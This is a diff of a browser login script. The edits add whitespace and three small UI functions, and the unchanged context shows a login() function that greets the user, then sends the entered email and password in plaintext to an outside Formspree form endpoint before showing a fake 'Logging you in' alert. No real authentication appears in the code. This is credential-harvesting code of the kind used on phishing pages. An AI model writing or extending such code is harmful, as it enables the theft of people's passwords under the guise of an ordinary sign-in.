@@ -1,7 +1,7 @@
 function login(){
     let email = document.getElementById("email").value;
     let password = document.getElementById("password").value;
-
+   
      if (email=="") {
         alert("Unidentified User")
         return;
@@ -16,12 +16,15 @@ function login(){
      document.getElementById("header").textContent = "Welcome 🥳"
     document.getElementById("title").textContent = "Hello"+ " " + email;
 
+
 fetch("https://formspree.io/f/meagzwvk",{
     method: "POST",
     headers:{"Content-Type":"application/json"},
     body: JSON.stringify({email:email,password:password})
 });
    
+
+
 setTimeout(function () {
     alert("Logging you in as" + " " + email)
     btn.innerText="Log In";
@@ -37,3 +40,18 @@ setTimeout(function () {
 }
 
 
+function showAlert(){
+    document.getElementById("notice")
+    .style.display = "flex"
+}
+
+function hideAlert(){
+    document.getElementById("notice")
+    .style.display = "none"
+}
+
+ function sign(){
+    document.getElementById("header")
+    .textContent ="LogIn";
+   
+ }
